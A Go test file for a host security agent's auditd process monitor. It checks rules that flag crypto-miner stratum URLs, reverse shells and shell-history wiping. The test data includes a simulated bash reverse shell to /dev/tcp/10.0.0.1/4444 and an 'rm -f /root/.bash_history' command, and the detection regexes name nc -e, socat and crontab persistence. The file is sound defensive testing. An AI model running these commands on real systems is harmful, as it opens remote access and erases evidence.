package guard

import (
	"fmt"
	"os"
	"strings"
	"testing"

	"github.com/alinksec/alinksec-agent/internal/config"
	pb "github.com/alinksec/alinksec-agent/internal/proto"
)

func auditLines(node, id, args string) []*pb.LogLine {
	return []*pb.LogLine{
		{Content: fmt.Sprintf(`%stype=SYSCALL msg=audit(1700000000.123:%s): success=yes pid=2147483646 uid=0 exe="/tmp/renamed" key="alinksec_exec"`, node, id)},
		{Content: fmt.Sprintf(`%stype=EXECVE msg=audit(1700000000.123:%s): argc=2 a0="renamed" a1=%s`, node, id, args)},
	}
}
func auditRules() []config.ProcessRule {
	return []config.ProcessRule{{ID: "indicator", Enabled: true, Actions: []string{"kill"}, Match: config.ProcessMatch{CmdlineRegex: `stratum\+tcp://`}}}
}
func processEvents(events []*pb.RptSecurityEvent) []*pb.RptSecurityEvent {
	var found []*pb.RptSecurityEvent
	for _, e := range events {
		if e.Type == "process" {
			found = append(found, e)
		}
	}
	return found
}
func TestAuditExitedRenamedProcessWithoutEOE(t *testing.T) {
	m := newAuditExecMonitor(t.TempDir())
	events, ok := m.observe(auditLines("", "1", `"stratum+tcp://pool"`), auditRules())
	found := processEvents(events)
	if !ok || len(found) != 1 || found[0].ActionTaken != "alert_only" || !strings.Contains(found[0].Detail, "historical_pid_not_a_live_process_identity") {
		t.Fatalf("unexpected: %v %v", ok, events)
	}
	events, ok = m.observe(auditLines("", "1", `"stratum+tcp://pool"`), auditRules())
	if !ok || len(processEvents(events)) != 0 {
		t.Fatal("duplicate execution")
	}
	events, ok = m.observe(auditLines("", "2", `"normal-work"`), auditRules())
	if !ok || len(processEvents(events)) != 0 {
		t.Fatal("benign execution matched")
	}
}
func TestAuditPartialRestartAndNodeIsolation(t *testing.T) {
	dir := t.TempDir()
	lines := auditLines("node=alpha ", "1", `7374726174756d2b7463703a2f2f706f6f6c`)
	m := newAuditExecMonitor(dir)
	if _, ok := m.observe(lines[:1], auditRules()); !ok {
		t.Fatal("persist")
	}
	m = newAuditExecMonitor(dir)
	other := auditLines("node=beta ", "1", `"stratum+tcp://pool"`)
	events, _ := m.observe(other[1:], auditRules())
	if len(processEvents(events)) != 0 {
		t.Fatal("cross-node correlation")
	}
	events, ok := m.observe(lines[1:], auditRules())
	if !ok || len(processEvents(events)) != 1 {
		t.Fatal("restart lost partial event")
	}
}
func TestAuditGapAndMalformedFailClosed(t *testing.T) {
	for _, kind := range []string{"gap", "duplicate", "failed", "fragmented"} {
		t.Run(kind, func(t *testing.T) {
			m := newAuditExecMonitor(t.TempDir())
			lines := auditLines("", "1", `"stratum+tcp://pool"`)
			switch kind {
			case "gap":
				lines = append(lines[:1], &pb.LogLine{Fields: map[string]string{"record_kind": "collection_status", "status": "missing"}}, lines[1])
			case "duplicate":
				lines[1].Content += ` a1="stratum+tcp://pool"`
			case "failed":
				lines[0].Content = strings.ReplaceAll(lines[0].Content, "success=yes", "success=no")
			case "fragmented":
				lines[1].Content = strings.ReplaceAll(lines[1].Content, "a1=", "a1[0]=")
			}
			lines = append(lines, &pb.LogLine{Content: "type=EOE msg=audit(1700000000.123:1):"})
			events, ok := m.observe(lines, auditRules())
			if !ok || len(processEvents(events)) != 0 {
				t.Fatalf("unsafe match: %v", events)
			}
		})
	}
}

func TestAuditDeploymentRules(t *testing.T) {
	raw, err := os.ReadFile("../../../deploy/audit/process-rules.yaml.example")
	if err != nil {
		t.Fatal(err)
	}
	cfg, err := config.Parse(raw)
	if err != nil {
		t.Fatal(err)
	}
	if !cfg.ProcessAuditLog || len(cfg.ProcessRules) != 2 {
		t.Fatal("audit example not enabled")
	}
	for i, cmd := range []string{"renamed stratum+tcp://pool", "sh -c echo /dev/tcp/example/443"} {
		if !processRuleMatches(cfg.ProcessRules[i], processObservation{exe: "/tmp/renamed", cmdline: cmd}) {
			t.Fatalf("example rule %d failed", i)
		}
		if processRuleMatches(cfg.ProcessRules[i], processObservation{exe: "/usr/bin/printf", cmdline: "printf hello"}) {
			t.Fatalf("benign matched %d", i)
		}
	}
}

func TestAuditExecMatchesFalcoRules(t *testing.T) {
	m := newAuditExecMonitor(t.TempDir())
	rules := []config.ProcessRule{
		{
			ID:       "PR-0005",
			Name:     "反弹 Shell 行为检测",
			Enabled:  true,
			Severity: 4,
			Match: config.ProcessMatch{
				CmdlineRegex: `(?i)(?:bash|sh|zsh|dash)\s+.*(?:-i\s+.*>&|/dev/tcp/[0-9.]+/|nc\s+.*-e\s+/(?:bin/)?(?:ba)?sh|socat\s+exec:.*pty|pty\.spawn\()`,
			},
		},
		{
			ID:       "PR-0008",
			Name:     "恶意持久化与历史清除",
			Enabled:  true,
			Severity: 3,
			Match: config.ProcessMatch{
				CmdlineRegex: `(?i)(?:rm\s+-[a-zA-Z]*f?[a-zA-Z]*\s+.*(?:\.bash_history|\.zsh_history)|history\s+-c|unset\s+HISTFILE|export\s+HISTSIZE=0|echo\s+.*>>\s*/var/spool/cron/|echo\s+.*>>\s*/etc/crontab)`,
			},
		},
	}

	// Simulated short-lived reverse shell process captured by auditd
	lines := []*pb.LogLine{
		{Content: `type=SYSCALL msg=audit(1700000000.456:101): success=yes pid=99999 uid=0 exe="/bin/bash" key="alinksec_exec"`},
		{Content: `type=EXECVE msg=audit(1700000000.456:101): argc=3 a0="bash" a1="-i" a2=">& /dev/tcp/10.0.0.1/4444 0>&1"`},
		{Content: `type=EOE msg=audit(1700000000.456:101):`},
	}
	events, ok := m.observe(lines, rules)
	if !ok {
		t.Fatal("observe failed")
	}
	pEvents := processEvents(events)
	if len(pEvents) != 1 {
		t.Fatalf("expected 1 process event, got %d", len(pEvents))
	}
	if pEvents[0].RuleId != "PR-0005" {
		t.Fatalf("rule = %s, want PR-0005", pEvents[0].RuleId)
	}

	// Simulated history deletion command captured by auditd
	linesHist := []*pb.LogLine{
		{Content: `type=SYSCALL msg=audit(1700000001.789:102): success=yes pid=99998 uid=0 exe="/bin/rm" key="alinksec_exec"`},
		{Content: `type=EXECVE msg=audit(1700000001.789:102): argc=3 a0="rm" a1="-f" a2="/root/.bash_history"`},
		{Content: `type=EOE msg=audit(1700000001.789:102):`},
	}
	events2, ok2 := m.observe(linesHist, rules)
	if !ok2 {
		t.Fatal("observe failed")
	}
	pEvents2 := processEvents(events2)
	if len(pEvents2) != 1 {
		t.Fatalf("expected 1 process event, got %d", len(pEvents2))
	}
	if pEvents2[0].RuleId != "PR-0008" {
		t.Fatalf("rule = %s, want PR-0008", pEvents2[0].RuleId)
	}
}
